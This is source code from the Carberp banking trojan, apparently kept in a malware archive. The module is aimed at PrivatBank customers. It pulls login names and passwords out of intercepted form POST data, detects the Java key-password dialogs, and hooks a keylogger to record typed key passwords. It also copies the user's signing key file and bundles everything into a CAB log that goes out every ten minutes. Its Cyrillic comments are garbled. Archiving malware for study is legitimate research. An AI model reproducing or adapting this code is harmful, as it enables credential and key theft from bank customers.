/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef PrivatBankH
	#error Exclude module from project
#endif


#pragma hdrstop

#include "PrivatBank.h"
#include "JavaAppletGrabbers.h"
#include "WndUtils.h"
#include "UniversalKeyLogger.h"
#include "Strings.h"
#include "Utils.h"
#include "StrConsts.h"
#include "BotClasses.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace PPRIVATDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define PRVDBG PPRIVATDEBUGSTRINGS::DBGOutMessage<>


// ������ ���������� � ������ StrConsts.cpp

extern CSSTR EStrPrivatBankGrabber[]; // ��� ������� ������� �����������
extern CSSTR EStrPrivatBankKeyPassWndMask[];  // ����� ��������� ���� ����� �����
extern CSSTR EStrPrivatBankKeyPassWndMask2[]; // ����� ��������� ������� ���� ����� �����
extern CSSTR EStrPrivatBankLoginMask[]; // ����� ����������� ������ ����������� � ������24
extern CSSTR EStrPrivatBankLogin[];    // �����
extern CSSTR EStrPrivatBankPassword[]; // ������



namespace  PrivatBank
{

	// ������������ ������
	DWORD PID = 0;
	string* LoginURLMask; // ����� ����������� ������ �����������
	TPrivatBank *Grabber = NULL;
	//------------------------------------------------



	//------------------------------------------------
	//  ShowWndHandler - ������������ ������� ��������
	//                   ����
	//------------------------------------------------
   /*	void WINAPI ShowWndHandler(PKeyLogger, DWORD, LPVOID Data)
	{
		if (!Grabber) return;

		PShowWindowData SW = (PShowWindowData)Data;

		if (SW->Command == SW_HIDE && SW->Window == Grabber->Wnd())
		{
			// ��� �������� ���� ���������� ���
			Grabber->SendLog();
			delete Grabber;
			Grabber = NULL;
            KeyLogger::DisconnectEventHandler(KLE_SHOW_WND, ShowWndHandler);
		}
	}  */



}



//------------------------------------------------
//  Initialize - ������� �������������� ������
//				 ������ ����� �����������
//------------------------------------------------
bool PrivatBank::Initialize(HWND Wnd, DWORD  WndClassHash)
{
	if (WndClassHash != JAVAWND_SUNAWTDIALOG)
		return false;

	// ���������� ����� ����
	string WndText = GetWndText2(Wnd);
	int WndType = TPrivatBank::IsKeyPassWnd(WndText);
	if (!WndType) return false;

	if (IsNewProcess(PID))
	{
		// �������������� ����� � ����� ��������
    	Grabber = NULL;
    }

	if (!Grabber)
	{
		PRVDBG("PrivatKeyPass", "������ ������ ����� ����������� ���������������");

		Grabber = new TPrivatBank();
		Grabber->ActivateKeyPassLogger(Wnd, WndText, WndType);
	}

	return true;
}



//------------------------------------------------
//  CheckPostData - ������� ��������� ���� ������
//                  �� ������� ����������� ������
//                  � ������
//
//  ������ ���������� ������ � ����
//  "UserName=login&UserPass=pass&......
//------------------------------------------------
void PrivatBank::CheckPostData(const char* URL, const char* PostData)
{

	if (IsNewProcess(PID))
	{
		// �������������� ����� � ����� ��������
		LoginURLMask = new string(GetStr(EStrPrivatBankLoginMask));
	}

	//��������� �����
	if (!WildCmp(URL, LoginURLMask->t_str()))
		return;

	// �������� ����� � ������
	string Login    = GetStr(EStrPrivatBankLogin);
	string Password = GetStr(EStrPrivatBankPassword);

	bool Valid = (STRA::Pos(PostData, Login.t_str()) >= 0) &&
				 (STRA::Pos(PostData, Password.t_str()) >= 0);
	if (!Valid) return;

	// ��������� ������ � ��������� ������
	TBotStrings Fields;
	Fields.SetDelimetedText(PostData, "&");

	string LoginValue      = Fields.GetValue(Login);
	string PasswordValue   = Fields.GetValue(Password);

	// ��������� ������
	if (!LoginValue.IsEmpty() && !PasswordValue.IsEmpty())
	{
		TPrivatBank Grabber;
		Grabber.AddLoginAndPassword(LoginValue, PasswordValue);
    }
}






//*****************************************************
// ������ �����������
//*****************************************************
TPrivatBank::TPrivatBank()
	: TGrabber(GetStr(EStrPrivatBankGrabber))
{
	FLog = NULL;
	FKeyPassWnd = NULL;
}

TPrivatBank::~TPrivatBank()
{
	if (FLog) delete FLog;
}


//------------------------------------------------
// ������� �������������� ����� �����
//------------------------------------------------
bool TPrivatBank::InitializeMainLog()
{
	if (!FLog)
	{
		FLog = new TGrabberFile(Name(), NULL, false);
		bool Created;
		FLog->Activate(&Created);
		if (Created)
		{
			FLog->SetSendAsCAB(true);
//			FLog->SetSendInterval(300000);
			FLog->SetSendInterval(600000);  // �������� 10 �����
        }
	}
	return FLog->Active();
}

//------------------------------------------------
// ������� ��������� � ��� ����� � ������
//------------------------------------------------
void TPrivatBank::AddLoginAndPassword(const string& Login, const string& Password)
{
	// ��� �����������, ��������� ������ ���
	if (FLog)
	{
		delete FLog;
		FLog = NULL;
	}

	TGrabberFile Log(Name());
	Log.CloseLog();

	if (InitializeMainLog())
	{
		FLog->AddText(GetStr(EStrLogFieldLogin), Login);
		FLog->AddText(GetStr(EStrLogFieldPassword), Password);
    }
}

//------------------------------------------------
//  ������� ��������� ���� ����� � �����
//------------------------------------------------
void TPrivatBank::AddKeyFile(const string& FileName)
{
	if (InitializeMainLog())
	{
		FLog->AddFile("Key", FileName, "Key", NULL);
	}
}


//------------------------------------------------
//  ������� ���������� ����� ������ �����
//------------------------------------------------
void TPrivatBank::ActivateKeyPassLogger(HWND Wnd, const string& WndText, int WndType)
{
	if (!Wnd) return;

	FKeyPassWnd = Wnd;

	// ���������� ��� ����
	FKeyPassFieldName = GetStr(EStrLogFieldKeyPassword);
	if (WndType == 2)
		FKeyPassFieldName += "2";

	// �������� ��� ����� ����� �� ��������� ����
	if (WndType == 1) ParseKeyFileName(WndText);

	// ���������� ���
	InitializeMainLog();

	// ������������ � ���������
	ConnectToKeyLogger();
}


//------------------------------------------------
// ������� ��������� ��������� ���� � ����������
// �� ������� �������� ���� ���� �������� �����
// ����� ������ �����
// ���������:
//            1 - ���� ����� ��������� ������
//            2 - ���� ����� ������� ������
//------------------------------------------------
int TPrivatBank::IsKeyPassWnd(const string& WndText)
{
	if (!WndText.IsEmpty())
    {
		// ��������� �������� ������
		string Mask = GetStr(EStrPrivatBankKeyPassWndMask);
		if (WildCmp(WndText.t_str(), Mask.t_str()))
			return 1;

		// ��������� ������ ������
		Mask = GetStr(EStrPrivatBankKeyPassWndMask2);
		if (WildCmp(WndText.t_str(), Mask.t_str()))
			return 2;
    }
	return 0;
}

//------------------------------------------
//  ������� ��������� ��������� ����
//  � ������� ����� ����� �����
//------------------------------------------
void TPrivatBank::ParseKeyFileName(const string& Text)
{
	PCHAR File = STRA::Scan(Text.t_str(), '"');
	if (!File) return;
	File++;
	PCHAR End = STRA::Scan(File, '"');
	if (End)
	{
		*End = 0;
		if (File::IsExists(File))
			AddKeyFile(File);
    }
}

//------------------------------------------
//  ������� �������� ��� ����������
//------------------------------------------
void TPrivatBank::LogKeyboad(HWND aWnd, const char* Text)
{
	if (aWnd == FKeyPassWnd)
	{
		if (FLog)
		{
			FLog->AddTextPart(FKeyPassWnd, FKeyPassFieldName, Text);
		}
    }
}


//------------------------------------------
// ������� ��������� ��������� �������
//------------------------------------------
void TPrivatBank::DoEvent(int EventId, LPVOID Param)
{
	// ������������  ������� ����
	if (EventId != KLE_SHOW_WND) return;

	PShowWindowData SW = (PShowWindowData)Param;

	if (SW->Command == SW_HIDE && SW->Window == FKeyPassWnd)
	{
		// ��� �������� ���� ��������� ���
		if (PrivatBank::Grabber == this)
		{
			PrivatBank::Grabber = NULL;
			delete this;   // ����������������
        }
	}
}





